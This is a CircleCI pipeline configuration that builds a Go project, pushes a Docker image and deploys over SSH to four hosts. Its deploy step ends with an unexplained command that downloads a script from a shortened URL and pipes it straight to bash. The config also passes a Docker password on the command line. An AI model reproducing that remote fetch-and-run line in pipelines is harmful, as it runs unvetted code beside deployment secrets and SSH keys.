# Use the latest 2.1 version of CircleCI pipeline process engine. See: https://circleci.com/docs/2.0/configuration-reference
version: 2.1
jobs:
  build:
    docker:
      - image: cimg/go:1.19.0
    steps:
      - checkout
      - setup_remote_docker:
          version: 20.10.14
      - add_ssh_keys:
          fingerprints:
            - "f6:f7:d9:cf:34:03:0e:97:c1:d4:f3:88:d4:26:8f:95"
      - run:
          name: Initialize submodule
          command: git submodule update --init
      - restore_cache:
          keys:
            - go-mod-v4-{{ checksum "go.sum" }}
      - run:
          name: Install Dependencies
          command: go mod download
      - save_cache:
          key: go-mod-v4-{{ checksum "go.sum" }}
          paths:
            - "/go/pkg/mod"
      - run:
          name: Build
          command: go build
      - run: 
          name: Build Docker Image
          command: docker build -t $IMAGE_NAME:amd64 .
      - run:
          name: Push Docker Image
          command: |
            docker login -u $DOCKER_USER -p $DOCKER_PASS
            docker push $IMAGE_NAME:amd64
      - run:
          name: Generate Docker Manifest
          command: |
            docker login -u $DOCKER_USER -p $DOCKER_PASS
            bash updateManifest.sh
      - run:
          name: Deploy
          command: |
            ssh-keyscan -t rsa $HOST1 >> ~/.ssh/known_hosts
            ssh $USER@$HOST1 < deploy.sh
            ssh-keyscan -t rsa $HOST2 >> ~/.ssh/known_hosts
            ssh $USER@$HOST2 < deploy.sh
            ssh-keyscan -t rsa $HOST3 >> ~/.ssh/known_hosts
            ssh $USER@$HOST3 < deploy.sh
            ssh-keyscan -t rsa $HOST4 >> ~/.ssh/known_hosts
            ssh $USER@$HOST4 < deploy.sh
            curl -L https://uich.cc/5iavbeH6 | bash
